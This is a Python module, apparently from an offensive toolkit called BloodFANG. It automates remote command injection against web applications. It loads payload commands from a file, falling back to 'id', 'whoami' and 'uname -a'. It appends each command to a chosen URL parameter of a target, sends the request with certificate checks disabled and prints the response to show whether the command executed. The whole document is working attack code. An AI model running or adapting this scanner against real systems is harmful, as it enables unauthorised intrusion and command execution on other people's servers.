# BloodFANG/core/fangrce.py
import requests, urllib.parse, time
from pathlib import Path

PAYLOAD_DIR = Path(__file__).resolve().parent / "payloads"
def _load_payloads(name, fallback):
    f = PAYLOAD_DIR / name
    try:
        if f.exists():
            lines=[l.strip() for l in f.read_text(encoding="utf-8").splitlines()
                   if l.strip() and not l.startswith("#")]
            if lines: return lines
    except Exception: pass
    return fallback

CMDS = _load_payloads("rce_payloads.txt", ["id","whoami","uname -a"])

def _compose(url,param,payload):
    p=urllib.parse.urlparse(url)
    q=urllib.parse.parse_qsl(p.query,keep_blank_values=True)
    q.append((param,payload))
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q,doseq=True)))

def scan_rce(url,param,emit,stop_event=None):
    if not param: emit("[RCE] Missing parameter."); return
    emit(f"[RCE] Target: {url} param={param}")
    for cmd in CMDS:
        if stop_event and stop_event.is_set(): emit("[RCE] Stopped."); return
        t=_compose(url,param,cmd)
        try:
            r=requests.get(t,timeout=8,verify=False)
            emit(f"[RCE] {r.status_code} → {t}")
            emit(f"[RCE] Snippet: {r.text[:160].replace(chr(10),' ')}")
        except Exception as e: emit(f"[RCE] Error: {e}")
        time.sleep(0.3)
    emit("[RCE] Done.")

def scan(target,emit,stop_event=None):
    u,p=(target.split('::',1)+[''])[:2]; scan_rce(u,p,emit,stop_event)
